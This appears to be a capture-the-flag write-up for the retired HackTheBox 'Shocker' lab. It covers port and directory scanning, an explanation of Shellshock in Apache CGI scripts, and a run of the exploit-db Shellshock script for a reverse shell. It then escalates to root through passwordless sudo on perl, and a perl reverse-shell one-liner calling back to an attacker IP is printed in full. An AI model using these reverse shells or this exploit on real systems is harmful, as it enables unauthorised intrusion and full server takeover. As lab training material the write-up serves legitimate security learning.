@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Shocker</strong></h1>
+        <em>Released: 30th September 2017 / Pwned: September 16th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Shocker is a straightforward box, providing that you've heard of the Apache Shellshock vulnerability before. If not, you'll probably get a little stuck.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Brute-force the web server for directories - find a <code>/cgi-bin</code> entry<br>
+        • Brute-force <code>/cgi-bin</code> for a directories/files - find a <code>user.sh</code> file<br>
+        • Run Apache Shellshock exploit against /cgi-bin/user.sh to gain a shell on the system<br>
+        • <code>sudo -l</code> to list sudo permissions - can run <code>perl</code> with sudo &amp; no password<br>
+        • Send a perl reverse shell back to your attacking system to get a shell as root<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sV -sC -T4 -oN nmap/tcp-top1000.txt 10.10.10.56</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -T4 aggressive scan<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/shocker#&nbsp;nmap&nbsp;-sV&nbsp;-sC&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-top1000.txt&nbsp;10.10.10.56<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.18&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html).<br>
+                2222/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.2&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9&nbsp;(ED25519)<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel
+            </div>
+        </div><br>
+        <br>
+        Analyse results:<br>
+        • Port 2222 looks like a normal ssh service but running on a non-standard port<br>
+        • Port 80 is a web server, and is probably a better lead than ssh<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - gobuster</strong></h2><br>
+        <code>http://10.10.10.56</code> tells you not to bug him.<br>
+        (In hindsight, this is probably a hint towards an Apache exploit - bug/exploit)<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        There's nothing in view-source, nothing in the image, so I ran <code>gobuster</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/shocker/80http#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.56/&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb-big.txt<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.56/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/09/14&nbsp;15:08:10&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.56/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.56/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.56/cgi-bin/&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.56/server-status&nbsp;(Status:&nbsp;403)<br>
+                =====================================================<br>
+                2019/09/14&nbsp;15:09:17&nbsp;Finished<br>
+                =====================================================
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) About CGI</strong></h3><br>
+        <code>/cgi-bin</code> exists, which means that this Apache server has the <code>mod_cgi</code> module installed.<br>
+        <br>
+        CGI stands for Common Gateway Interface.<br>
+        CGI is a protocol designed to allow web servers (e.g. Apache) to run scripts (system commands, php code, python code etc.) on the server, and return the output to the client via HTTP.<br>
+        It's normally used to generate dynamic content on websites, but is also used by admins for logging etc.<br>
+        <br>
+        • <code>mod_cgi</code> is the Apache plugin.<br>
+        • <code>/cgi-bin</code> is one diretory where the scripts can be stored.<br>
+        ◇ CGI will run all kinds of scripts - shell, perl, php, python etc.<br>
+        <br>
+        <a href="https://httpd.apache.org/docs/current/mod/mod_cgi.html">https://httpd.apache.org/docs/current/mod/mod_cgi.html</a><br>
+        <a href="http://docs.1h.com/Mod_cgi">http://docs.1h.com/Mod_cgi</a><br>
+        <a href="https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/">https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/</a><br>
+        <br>
+        We can abuse the fact that <code>mod_cgi</code> is installed with the Apache Shellshock vulnerability.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) About Shellshock</strong></h2><br>
+        <strong>Shellshock</strong><br>
+        Shellshock was a vulnerability found in 2014 where code could be appended to the end of environment variables. A flaw in the Bash shell's parser meant that these appended commands got executed, and an attacker could run arbitrary code.<br>
+        <br>
+        <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</a><br>
+        <br>
+        Shellshock is acutally a collection of vulns, because it affects a bunch of different software.<br>
+        <a href="https://github.com/mubix/shellshocker-pocs">https://github.com/mubix/shellshocker-pocs</a><br>
+        <br>
+        <strong>Apache Shellshock</strong><br>
+        The shellshock vulnerability affects Apache <code>mod_cgi</code> scripts.<br>
+        I have no idea how.<br>
+        Most exploits just provide bash code within a header (e.g. Referer or Cookie) and the code gets executed ¯\_(ツ)_/¯<br>
+        <br>
+        Metasploit module - <code>apache_mod_cgi_bash_env_exec</code><br>
+        Exploitdb code (really great/easy) - <a href="https://www.exploit-db.com/exploits/34900">https://www.exploit-db.com/exploits/34900</a><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Apache Shellshock shell</strong></h2><br>
+        First, we need to find a scrip in <code>/cgi-bin</code> to target.<br>
+        Search for files ending in .sh in /cgi-bin with gobuster.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/shocker/80http#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.56/cgi-bin/&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb-big-cgi_bin&nbsp;-x&nbsp;.sh<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.56/cgi-bin/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Extensions&nbsp;&nbsp;&nbsp;:&nbsp;sh<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/09/16&nbsp;10:39:50&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.56/cgi-bin/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.56/cgi-bin/.htpasswd.sh&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.56/cgi-bin/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.56/cgi-bin/.htaccess.sh&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.56/cgi-bin/user.sh&nbsp;(Status:&nbsp;200)<br>
+                =====================================================<br>
+                2019/09/16&nbsp;10:42:06&nbsp;Finished
+            </div>
+        </div><br>
+        <br>
+        We've found a target - <code>http://10.10.10.56/cgi-bin/user.sh</code>.<br>
+        <br>
+        Copy the exploitdb exploit to your working directory.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/shocker#&nbsp;searchsploit&nbsp;apache&nbsp;mod_cgi<br>
+                ------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                ------------------------------------------&nbsp;----------------------------------------<br>
+                Apache&nbsp;mod_cgi&nbsp;-&nbsp;'Shellshock'&nbsp;Remote&nbsp;Comm&nbsp;|&nbsp;exploits/linux/remote/34900.py<br>
+                ------------------------------------------&nbsp;----------------------------------------<br>
+                Shellcodes:&nbsp;No&nbsp;Result<br>
+                <br>
+                root@gotham:~/ctf/shocker#&nbsp;cp&nbsp;/usr/share/exploitdb/exploits/linux/remote/34900.py&nbsp;.<br>
+                root@gotham:~/ctf/shocker#&nbsp;mv&nbsp;34900.py&nbsp;shellshock.py
+            </div>
+        </div><br>
+        <br>
+        And run the script against the target.<br>
+        You'll have a shell on the system.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/shocker#&nbsp;python&nbsp;shellshock.py&nbsp;payload=reverse&nbsp;rhost=10.10.10.56&nbsp;lhost=10.10.14.6&nbsp;lport=9001&nbsp;pages=/cgi-bin/user.sh<br>
+                [!]&nbsp;Started&nbsp;reverse&nbsp;shell&nbsp;handler<br>
+                [-]&nbsp;Trying&nbsp;exploit&nbsp;on&nbsp;:&nbsp;/cgi-bin/user.sh<br>
+                [!]&nbsp;Successfully&nbsp;exploited<br>
+                [!]&nbsp;Incoming&nbsp;connection&nbsp;from&nbsp;10.10.10.56<br>
+                10.10.10.56&gt;&nbsp;id<br>
+                uid=1000(shelly)&nbsp;gid=1000(shelly)&nbsp;groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)<br>
+                <br>
+                10.10.10.56&gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Grab <code>user.txt</code> :)<br>
+            <div class="codebox">
+                10.10.10.56&gt;&nbsp;cd&nbsp;&nbsp;/home/shelly<br>
+                10.10.10.56&gt;&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;36K<br>
+                [...]<br>
+                -rw-r--r--&nbsp;1&nbsp;shelly&nbsp;shelly&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Sep&nbsp;22&nbsp;&nbsp;2017&nbsp;.sudo_as_admin_successful<br>
+                -r--r--r--&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33&nbsp;Sep&nbsp;22&nbsp;&nbsp;2017&nbsp;user.txt<br>
+                <br>
+                10.10.10.56&gt;&nbsp;cat&nbsp;user.txt<br>
+                2ec24e1...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) sudo -l</strong></h2><br>
+        When grabbing <code>user.txt</code>, we also saw <code>.sudo_as_admin_successful</code>.<br>
+        Run <code>sudo -l</code> to see what <code>shelly</code> can run with <code>sudo</code>.<br>
+            <div class="codebox">
+                10.10.10.56&gt;&nbsp;sudo&nbsp;-l<br>
+                Matching&nbsp;Defaults&nbsp;entries&nbsp;for&nbsp;shelly&nbsp;on&nbsp;Shocker:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;env_reset,&nbsp;mail_badpass,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>
+                <br>
+                User&nbsp;shelly&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;Shocker:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(root)&nbsp;NOPASSWD:&nbsp;/usr/bin/perl
+            </div>
+        </div><br>
+        <br>
+        We can run <code>perl</code> as <code>root</code> with no password.<br>
+        Great :) We can get a root shell by sending a perl reverse shell back to our attacking system.<br>
+        <br>
+        Here's a perl reverse shell:<br>
+        <code>perl -e 'use Socket;$i="ATTACKING-IP";$p=&lt;ATTACKING PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code><br>
+        <br>
+        Start a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/shocker#&nbsp;nc&nbsp;-lvnp&nbsp;9002<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run the perl reverse shell on the target with <code>sudo</code>.<br>
+            <div class="codebox">
+                10.10.10.56&gt;&nbsp;sudo&nbsp;perl&nbsp;-e&nbsp;'use&nbsp;Socket;$i="10.10.14.6";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh&nbsp;-i");};'
+            </div>
+        </div><br>
+        <br>
+        You should be sent a root shell on your listener!<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.6]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.56]&nbsp;39194<br>
+                /bin/sh:&nbsp;0:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                #&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                #&nbsp;cat&nbsp;/root/root.txt<br>
+                52c27156...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
